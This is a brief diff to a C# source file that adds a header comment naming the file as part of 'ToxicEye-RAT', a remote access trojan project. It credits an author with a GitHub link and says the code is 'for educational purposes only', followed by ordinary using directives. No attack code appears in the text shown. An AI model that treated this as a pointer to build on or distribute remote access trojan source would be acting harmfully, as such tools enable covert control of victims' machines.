@@ -1,4 +1,12 @@
-﻿using System;
+﻿/* 
+       ^ Author    : LimerBoy
+       ^ Name      : ToxicEye-RAT
+       ^ Github    : https://github.com/LimerBoy
+
+       > This program is distributed for educational purposes only.
+*/
+
+using System;
 using System.IO;
 using System.Linq;
 using System.Diagnostics;
